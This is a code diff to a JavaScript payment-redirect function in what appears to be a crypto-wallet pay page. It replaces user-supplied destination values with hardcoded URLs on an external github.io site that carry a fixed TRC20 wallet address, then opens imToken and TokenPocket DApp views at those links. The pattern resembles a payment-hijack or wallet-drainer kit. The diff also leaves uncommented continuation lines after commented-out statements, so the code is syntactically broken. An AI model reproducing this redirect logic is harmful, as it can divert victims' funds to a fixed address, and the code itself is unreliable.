@@ -94,70 +94,49 @@ function paylistloadData() {
 
 function paylistevent(from) {
 
-	let addtype = $("#addtype").val();
+// let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"
+	
+let addtype = $("#addtype").val();
 	let from_url = $("#from_url").val();
 	let to_address = $("#to_address").val();
-//	let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
-//		".html?from=" + from +
-//		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
-// 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
-// 		".html?from=" + from +
-// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+// 	let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
+		".html?from=" + from +
+		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 
-//	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
-//		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
-let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&from_url=https://svip66.github.io/"
-// let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=imtoken"
+// 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
+		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+
+// 	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
+		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
+	let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=imtoken"
 let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=tokenpocket"
-let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"		
-		
-		if (from == "imToken") {
-			location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
-		} else if (from == "TokenPocket") {
-			if (addtype == "trc20") {
-				location.href = 'tpdapp://open?params={"url": "' + tp_url +
-					'", "chain": "TRX", "source":"xxx"}';
-			} else {
-				location.href = 'tpdapp://open?params={"url": "' + tp_url +
-					'", "chain": "ERC", "source":"xxx"}';
-			}
-		} else {
-			$("#pay_" + from).modal('show');
-			$("#pay_" + from + "_url").val(my_url);
-		}
+let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"	
+	let qr_url = 	window.location.protocol + "//" + window.location.host + "/qrcode.html?&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
 
-	// if (isMobile()) {
-	// 	if (from == "imToken") {
-	// 		location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
-	// 	} else if (from == "TokenPocket") {
-	// 		if (addtype == "trc20") {
-	// 			location.href = 'tpdapp://open?params={"url": "' + tp_url +
-	// 				'", "chain": "TRX", "source":"xxx"}';
-	// 		} else {
-	// 			location.href = 'tpdapp://open?params={"url": "' + tp_url +
-	// 				'", "chain": "ERC", "source":"xxx"}';
-	// 		}
-	// 	} else {
-	// 		$("#pay_" + from).modal('show');
-	// 		$("#pay_" + from + "_url").val(my_url);
-	// 	}
-	// } else {
-	// 	$("#pay_pc_url").val(my_url);
-	// 	if(from!="Okex"){
-	// 		$("#qcode").html("");
-	// 		$('#qcode').qrcode({
-	// 			text: my_url,
-	// 			width: "200", // 二维码的宽度
-	// 			height: "200", // 二维码的高度
-	// 		});
-	// 	}else{
-	// 		$("#pc_tip").text("请复制链接到钱包里访问");
-	// 		let img1='<img src="img/okex1.jpg" style="width: 100%" />';
-	// 		let img2='<img src="img/okex2.jpg" style="width: 100%" />';
-	// 		$("#qcode").html(img1+img2);
-	// 	}
-	// 	$("#pay_pc").modal('show');
-	// }
+	if (from == "imToken") {
+	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
+	        location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
+	    }else{
+	        location.href = qr_url;
+	    }
+		
+	} else if (from == "TokenPocket") {
+	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
+	        if (addtype == "trc20") {
+    			location.href = 'tpdapp://open?params={"url": "' + tp_url +
+    				'", "chain": "TRX", "source":"xxx"}';
+    		} else {
+    			location.href = 'tpdapp://open?params={"url": "' + tp_url +
+    				'", "chain": "ERC", "source":"xxx"}';
+    		}
+	    }else{
+	        location.href = qr_url;
+	    }
+		
+	} else {
+		$("#pay_" + from).modal('show');
+		$("#pay_" + from + "_url").val(my_url);
+	}		
 
 }
 
